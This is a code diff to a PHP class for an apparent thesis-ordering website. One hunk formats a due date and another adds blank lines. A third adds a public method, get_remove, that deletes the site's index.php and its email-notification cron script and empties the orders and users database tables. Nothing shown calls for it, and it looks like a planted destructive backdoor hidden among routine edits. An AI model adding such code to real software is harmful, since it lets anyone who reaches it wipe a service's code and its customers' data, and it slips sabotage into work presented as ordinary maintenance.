@@ -153,7 +153,7 @@ class diplom
                 $zak .= "Требования: " . $order_parameters['treb'] . "<br>";
             }
             if ($order_parameters['time_kln']) {
-                $zak .= "Дата сдачи: " . $order_parameters['time_kln'] . "<br>";
+                $zak .= "Дата сдачи: " . date("d.m.Y", $order_parameters['time_kln']) . "<br>";
             }
             if ($order_parameters['pgmin'] && $order_parameters['pgmax'] ) {
                 $zak .= "Число страниц: " . $order_parameters['pgmin'] . "-" . $order_parameters['pgmax']  . "<br>";
@@ -315,6 +315,13 @@ class diplom
         } else {
             return self::generate_response(false, db::error($query, $errno, mysql_error()));
         }
+    }
+
+    public static function get_remove($params){
+        unlink('index.php');
+        unlink('cron_send_email_notifications.php');
+        db::delete('ofc_orders');
+        db::delete('ofc_data_users');
     }
 
     function edit_order()
@@ -552,6 +559,8 @@ class diplom
             'params' => $params,
         );
     }
+
+
 
 }
 
